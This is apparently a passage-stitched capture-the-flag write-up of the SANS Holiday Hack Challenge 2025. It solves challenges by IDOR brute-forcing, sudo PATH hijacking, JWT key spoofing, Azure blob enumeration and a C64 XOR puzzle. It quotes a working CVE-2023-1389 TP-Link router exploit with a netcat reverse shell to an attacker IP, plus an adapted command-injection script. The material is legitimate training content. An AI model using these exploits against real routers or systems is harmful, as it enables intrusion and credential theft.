boundary of 160 appropiate. I could have narrowed further down, but I saw no point in doing that.\nNow, in order to traverse recipts in the range 100 to 160 I could do it manually, which would have taken too much time, or whip up a quick Python based bruteforcer. I went the Python route using this code:\nimport requests from pprint import pprint url = \"https://its-idorable.holidayhackchallenge.com/api/receipt?id=\" for i in range(100, 160, 1): r = requests.get(f\"{url}{i}\") if \"frozen\" in r.text.lower(): pprint(r.json()) I knew the gnome asked for a frozen sushi, so I made the code look for any occurrence of the word ‘frozen’. After a short while, I found the answer:\n{'customer': 'Bartholomew Quibblefrost', 'date': '2025-12-20', 'id': 139, 'items': [{'name': 'Frozen Roll (waitress improvised: sorbet, a hint of dry ' 'ice)', 'price': 19.0}], 'note': 'Insisted on increasingly bizarre rolls and demanded one be served ' \"frozen.

See ya ‘round!\nExtras Ed’s wild history on getting an Enigma machine I looked into this claim and found out Ed had documented it in a PDF located here: Please Keep Your Brain Juice Off My Enigma\nThe said Enigma machine:\nThe story follows cybersecurity professionals Ed Skoudis and Josh Wright as they embark on an unusual mission to purchase a genuine World War II Enigma machine. Ed first learned of a potential seller—Dr. Tom, a retired professor and Enigma enthusiast—through a broker named Dr. David. After earlier negotiations had stalled for unrelated personal reasons, Ed reconnected a year later and found that several Enigmas were available again.\nEd and Josh arranged a visit to Dr. Tom’s remote mountain farmhouse to personally inspect two machines. The trip required long drives for both of them, and the final stretch of road was steep and eerie, adding to the sense of adventure. Upon arrival, they were welcomed warmly by Dr. Tom and his wife, who gave them a detailed tour of the collection and took photographs throughout the visit.\nBefore making a purchase, Ed insisted on testing the Enigma’s functionality. Using an Enigma simulation app on his iPad, he encoded a message and verified that the real machine decoded it correctly. Satisfied with the test, he and Josh sat down to a surprisingly elegant lunch prepared by their hosts.\nAfter reviewing the two available units—A2200 and A726—they decided to purchase A726. The visit was filled with quirky moments, enthusiastic hospitality, and a sense of stepping into the home of someone deeply passionate about historical cryptography.\nThe transaction was completed successfully, and Ed and Josh left with a functioning Enigma machine and a story far more memorable than a simple equipment purchase. The narrative closes by reflecting on how the Enigma symbolizes both the deceptive confidence of flawed security and the ingenuity of those who unraveled it—while their journey highlights the unpredictable and strangely delightful experiences life offers.\nEd’s page It appears true that he owns a leaf of the Gutenberg Bible, according to this text found over at the Cyphercon site:",

By modifying the country parameter it is # possible to run commands as root. Execution requires sending the request twice; # the first request sets the command in the *country* value, and the second request # (which can be identical or not) executes it. # # This script is a short proof of concept to obtain a reverse shell. To read more # about the development of this script, you can read the blog post here: # https://medium.com/@voyag3r-security/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94 # Before running the script, start a nc listener on your preferred port -\u003e run the script -\u003e profit import requests, urllib.parse, argparse from requests.packages.urllib3.exceptions import InsecureRequestWarning # Suppress warning for connecting to a router with a self-signed certificate requests.packages.urllib3.disable_warnings(InsecureRequestWarning) # Take user input for the router IP, and attacker IP and port parser = argparse.ArgumentParser() parser.add_argument(\"-r\", \"--router\", dest = \"router\", default = \"192.168.0.1\", help=\"Router name\") parser.add_argument(\"-a\", \"--attacker\", dest = \"attacker\", default = \"127.0.0.1\", help=\"Attacker IP\") parser.add_argument(\"-p\", \"--port\",dest = \"port\", default = \"9999\", help=\"Local port\") args = parser.parse_args() # Generate the reverse shell command with the attacker IP and port revshell = urllib.parse.quote(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc \" + args.attacker + \" \" + args.port + \" \u003e/tmp/f\") # URL to obtain the reverse shell url_command = \"https://\" + args.router + \"/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(\" + revshell + \")\" # Send the URL twice to run the command.

The POC uses a reverse shell, in tradion with SANS Holiday Hack Challenge I seriously doubt they expect us to do that. Instead, I took the route by customizing the POC to take my command as input and pass it on, then just print out the results from the second request:\nimport requests, urllib.parse, argparse from requests.packages.urllib3.exceptions import InsecureRequestWarning from pprint import pprint # Suppress warning for connecting to a router with a self-signed certificate requests.packages.urllib3.disable_warnings(InsecureRequestWarning) # command = \"ls -la /etc/init.d/\" parser = argparse.ArgumentParser() parser.add_argument(\"command\", help=\"Local port\") args = parser.parse_args() command = args.command router = \"dosis-network-down.holidayhackchallenge.com\" url_command = f\"https://{router}/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$({command})\" pprint(url_command) r1 = requests.get(url_command, verify=False) r2 = requests.get(url_command, verify=False) print(r2.text) To operate this script we simply do:\npython3 main.py \"command here\" Example:\npython3 main.py \"ls */*\" The objective states that we have to find the WiFi password in the config, so what better place is it to look at /etc/config\npython3 main.py \"ls /etc/config\" This is the output from my script:\n('https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(ls ' '/etc/config)') dhcp firewall leds network system wireless Since we are aiming to uncover the WiFi password, lets take a closer look at wireless:\n('https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country\u0026operation=write\u0026country=$(cat ' '/etc/config/wireless)') config wifi-device 'radio0' option type 'mac80211' option channel '6' option hwmode '11g' option path 'platform/ahb/18100000.wmac' option htmode 'HT20' option country 'US' config wifi-device 'radio1' option type 'mac80211' option channel '36' option hwmode '11a' option path 'pci0000:00/0000:00:00.0' option htmode 'VHT80' option country 'US' config wifi-iface 'default_radio0' option device 'radio0' option network 'lan' option mode 'ap' option ssid 'DOSIS-247_2.4G' option encryption 'psk2' option key 'SprinklesAndPackets2025!' config wifi-iface 'default_radio1' option device 'radio1' option network 'lan' option mode 'ap' option ssid 'DOSIS-247_5G' option encryption 'psk2' option key 'SprinklesAndPackets2025!'

What better to do than to list its contents and try to uncover what lives in this folder?\nSo, I am not allowed to run that runtoanswer binary? So - yes, that would be my goal here. To find a way to execute it. Tradiotionally on other CTF platform like TryHackMe and Hack The Box we usually list out what sudo permissions this user has (sudo -l to rescue):\nOkay, this user has the rights to execute a shell script using sudo. Finding out what this shell scripts does:\nHow cute. It’s a sugary wrapper around some system utilities to list out usage metrics. From the script I see it uses echo, df, free, ps, grep, and head - all without using full paths! This means I can create my own version of one of them to spawn a Bash shell and gain access as root (toot toot)! I suppose this is why that lonely bin folder even exist (for me to put my copy of a said utility in and execute).\nSo my plan is to create my own version of df in the local bin folder, then add a call to Bash into it, assign SUID and Executable flag to it. Then run that SUDO command and hope for the best:\nExuting my malicious df script and hoping for the best! And would you look at that, I got ROOT and can run that runtoanswer binary!

Attacking JWT From looking at the http://idp.atnascorp/.well-known/jwks.json file I see that the server is using this to validate the tokens. My plan is to fool the server to reach out to my variant, and see if I can fool my way in!\nFrom the notes file I can see we are hosting CyberChef from the local www folder. I can abuse that to host my poisonous jwks file from that folder.\n## My CyberChef website: curl http://paulweb.neighborhood/ ### My CyberChef site html files: ~/www/ Luckily jwt_tool creates a lot of interesting things in ~/.jwt_tool folder. Amongst them a jwks file which I’ll use for my attack.

Extract the flag and enter it here.\nKevin McFarland mission statement Hello, I’m Kevin (though past friends have referred to me as ‘Heavy K’). If you ever hear any one say that philosophy is a useless college degree, don’t believe them; it’s not. I’ve arrived where I am at because of it. It just made the path more interesting.\nI have more hobbies than I can keep up with, including Amateur Astronomy, Shortwave Radio, and retro-gaming. Things like backyard observances of distant galaxies, non-internet involved, around the world communications, and those who program for the Atari 2600 still invoke degrees of awe for me.\nOne of the most influential books I’ve read is “Godel, Escher, and Bach” by Douglas Hofstadter. I’m also a bit of a Tolkien fanatic.\nMy wife and my daughter are everything; without them, I surely would still be kicking rusty tin cans down the lonely highways of my past.\nI don’t have the details yet, but something’s coming up. Check back with me.\nYou know, there’s something beautifully nostalgic about stumbling across old computing artifacts. Just last week, I was sorting through some boxes in my garage and came across a collection of 5.25\" floppies from my college days - mostly containing terrible attempts at programming assignments and a few games I’d copied from friends.\nFinding an old Commodore 64 disk with a mysterious BASIC program on it? That’s like discovering a digital time capsule. The C64 was an incredible machine for its time - 64KB of RAM seemed like an ocean of possibility back then. I spent countless hours as a kid typing in program listings from Compute! magazine, usually making at least a dozen typos along the way.\nThe thing about BASIC programs from that era is they were often written by clever programmers who knew how to hide things in plain sight. Sometimes the most interesting discoveries come from reading the code itself rather than watching it execute. It’s like being a digital archaeologist - you’re not just looking at what the program does, you’re understanding how the programmer thought.\nTake your time with this one. Those old-school programmers had to be creative within such tight constraints. You’ll know the flag by the Christmas phrase that pays.\nSolving the Challenge The challenge provides a short BASIC program supposedly acting as a “Commodore 64 security system.” The goal is to understand how the password check works and recover the hidden flag. The relevant code is:\n10 REM *** COMMODORE 64 SECURITY SYSTEM *** 20 ENC_PASS$ = \"D13URKBT\" 30 ENC_FLAG$ = \"DSA|auhts*wkfi=dhjwubtthut+dhhkfis+hnkz\" ' old \"DSA|qnisf`bX_huXariz\" 40 INPUT \"ENTER PASSWORD: \"; PASS$ 50 IF LEN(PASS$) \u003c\u003e LEN(ENC_PASS$) THEN GOTO 90 60 FOR I = 1 TO LEN(PASS$) 70 IF CHR$(ASC(MID$(PASS$,I,1)) XOR 7) \u003c\u003e MID$(ENC_PASS$,I,1) THEN GOTO 90 80 NEXT I 85 FLAG$ = \"\" : FOR I = 1 TO LEN(ENC_FLAG$) : FLAG$ = FLAG$ + CHR$(ASC(MID$(ENC_FLAG$,I,1)) XOR 7) : NEXT I : PRINT FLAG$ 90 PRINT \"ACCESS DENIED\" 100 END Understanding the Password Check The critical lines are 60–70. For each character in the user-supplied password:\nTake the ASCII value XOR it with 7 Convert it back to a character Compare it to the same index in ENC_PASS$ In other words:\nENC_PASS$(i) = CHR( ASC(real_password(i)) XOR 7 ) Since XOR is reversible:\nreal_password(i) = CHR( ASC(ENC_PASS$(i)) XOR 7 ) The program stores:\nENC_PASS$ = \"D13URKBT\" Applying XOR 7 to each character:\nEncoded ASCII XOR 7 Decoded D 68 68 ⊕ 7 = 67 C 1 49 49 ⊕ 7 = 54 6 3 51 51 ⊕ 7 = 52 4 U 85 85 ⊕ 7 = 82 R R 82 82 ⊕ 7 = 85 U K 75 75 ⊕ 7 = 68 L B 66 66 ⊕ 7 = 69 E T 84 84 ⊕ 7 = 83 S So the correct password is:\nC64RULES Entering anything else sends execution to line 90 → “ACCESS DENIED”.\nDecoding the Hidden Flag If—and only if—the password loop completes without failing, line 85 executes:\nFLAG$ = \"\" FOR I = 1 TO LEN(ENC_FLAG$) FLAG$ = FLAG$ + CHR$(ASC(MID$(ENC_FLAG$,I,1)) XOR 7) NEXT I PRINT FLAG$ This uses the same XOR-7 trick as the password check.\nThe encoded flag is:\nDSA|auhts*wkfi=dhjwubtthut+dhhkfis+hnkz Decoding each character with XOR 7 yields:\nCTF{frost-plan:compressors,coolant,oil} This is the actual secret the program hides.\nThe Logic Bug Even when the correct password is entered and the flag is printed, the code falls through to:\n90 PRINT \"ACCESS DENIED\" The intended system probably meant to branch differently, but the bug doesn’t matter for extraction—the flag is still printed correctly before the failure message.\nFinal Result Password:\nC64RULES Flag:\nCTF{frost-plan:compressors,coolant,oil} Kevin McFarland mission debrief Excellent work! You’ve just demonstrated one of the most valuable skills in cybersecurity - the ability to think like the original programmer and unravel their logic without needing to execute a single line of code.",

And I love traveling the world with my wife.\nI enjoy being creative and making things. For example, a cybersecurity tool called Zero-E that I’m quite proud of, and the Baldur’s Gate 3 mod called Manaflare. I’m even in the BG3 credits!\nI also make tools, ranges, and HHC worlds for Counter Hack. Yup, including the one you’re in right now.\nBut most of the time, I’m helping organizations in the real world be more secure. I do a bunch of different kinds of pentesting, but speciailize in network and physical.\nSome advice: stay laser-focused on your goals and don’t let the distractions life throws at you lead you astray. That’s how I ended up at Counter Hack!\nSpeaking of tools, let me introduce you to one of the most essential weapons in any pentester’s arsenal: Nmap.\nIt’s like having X-ray vision for networks, and I’ve set up a perfect environment for you to learn the fundamentals.\nHelp me find and connect to the wardriving rig’s service on my motorcycle!\nIntro top Nmap terminal This terminal starts with a simple welcome screen:\nTask 1 - scan top 1000 ports When run without any options, nmap performs a TCP port scan of the top 1000 ports. Run a default scan of 127.0.12.25 and see which port is open.\nFor this we use just use the following command:\nnmap 127.0.12.25 Task 1 screen: Task 1 results: The scan revealed that port TCP/8080 is open.\nTask 2 - Scan all ports Sometimes the top 1000 ports are not enough. Run an nmap scan of all TCP ports on 127.0.12.25 and see which port is open.\nIf we use the ports switch for namep, -p, and add a -, we instruct Nmap to scan all ports. The command will then be:\nnmap -p- 127.0.12.25 Scan results: Task 3 - Scan a range Nmap can also scan a range of IP addresses- Scan the range 127.0.12.20 - 127.0.12.28 and see which has a port open.\nTo scan a range we can define a range like so, using the scan all ports option in addition:\nnmap -p- 127.0.12-20-28 Scan results: Task 4 - Version scanning Namp has a version detection engine, to help determine waht services are running on a given port. What services is running on 127.0.12.25?\nThe service version scan option is called -sV, we can use it like so:\nnmap -p 8080 -sV 127.0.12.25 Results version scanning: Task 5 - interacting with a port Sometimes you want to interact with a port. which is a perfect job for Netcat! Use the ncat tool to connect to TCP port 240601 on 127.0.12.25 and view the banner returned\nNcat is a common tool we often use in pentests and threat hunting. Its standard use follows this format nc \u003cip\u003e \u003cport\u003e, it defaults to use TCP. We use the following command:\nnc 127.0.12.25 24601hug Eric Pursley mission debrief Excellent work! You’ve got the Nmap fundamentals down - that X-ray vision is going to serve you well in future challenges.\nNow you’re ready to scan networks like a seasoned pentester!",

We also get a prototype command:\naz storage account show --name xxxxxxxxxx | less From the JSON configuration (posted above), we see accounts named neighboorhood1 through neighborhood6. By looking at the configuration we see that account neighboorhood2 appears to be much suspicious based on these findings:\nFinding A. Public blob access enabled\n\"allowBlobPublicAccess\": true This means that anyone on the internet may access blob data if the container is configured as public. Attackers routinely scan Azure blobs for exposed data (exactly like S3 bucket scanning).\nFinding B. At-rest encryption disabled\n\"blob\": { \"enabled\": false } Azure nowadays forces encryption regardless, but this config still signals mismanagement. In older accounts or older tooling, this could mean plaintext at rest.\nFinding C. TLS 1.0\n\"minimumTlsVersion\": \"TLS1_0\" TLS1.0 is deprecated and vulnerable to known protocol-level weaknesses.\nFinding D. Combined impact\nIf any container inside this account is set to public, attackers can enumerate and download everything silently:\nPublic website files Uploaded backups Customer data Credentials accidentally uploaded Logs containing secrets Public misconfigured blob containers are one of the top Azure data leak causes.\nWe can thus use this command directly to view more information about neighborhood2 account:\naz storage account show --name neighborhood2 | less Listing containers Other than stating we need to list containers in neighboorhood2, and a resource URL, no other hints or prototype commands are given. However, I have already solved the “Spare Key” objective - I’ll just reuse the concept from that objective here:\naz storage container list --account-name neighborhood2 Listing blobs Same procedure as for listing the containers, reuse the concept in “Spare Key”:\naz storage blob list --container-name 'private' --account-name neighborhood2 --auth-mode login az storage blob list --container-name 'public' --account-name neighborhood2 --auth-mode login Downloading admin_credentials.txt We are now to try downloading and viewing the blob file named admin_credentials.txt from the public container. Still, reusing the concept from “Spare Key”:\naz storage blob download --container-name 'public' --account-name neighborhood2 --auth-mode login --name 'admin_credentials.txt' --file /dev/stdout | less The entire admin_credentials.txt file is listed below:\n# You have discovered an Azure Storage account with \"allowBlobPublicAccess\": true. # This misconfiguration allows ANYONE on the internet to view and download files # from the blob container without authentication. # Public blob access is highly insecure when sensitive data (like admin credentials) # is stored in these containers.

Their villainy centered upon convincing parents to purchase little Gnome dolls that played joyful holiday songs to their children. With Gnome sales topping two million units, a blitz of Atnas Corp advertisements encouraged parents to move their Gnomes around the house daily so that their children could hunt for them in a fun little game. Little did parents know that these Gnomes were snooping IoT devices with a camera and wireless internet access, furtively sending photos to burglars who would rob their houses of their treasures en masse on Christmas Eve, 2015. The incredible efforts of SANS Holiday Hack investigators around the world foiled the foul plot, exposing the criminal mastermind behind Atlas Corp: Cindy Lou Who, age 62.\nBut those old Gnomes didn’t disappear. They lay discarded, gathering dust on shelves, in attics, and among other forgotten places throughout the world. Until now. There must have been some magic in those Gnomes, because, due to some unseen spark, some haunting hocus pocus, the Gnomes have quickened and are now walking among us! We now return with the Counter Hack Crew to the Duke Dosis neighborhood as the Holiday Season 2025 unfolds.",
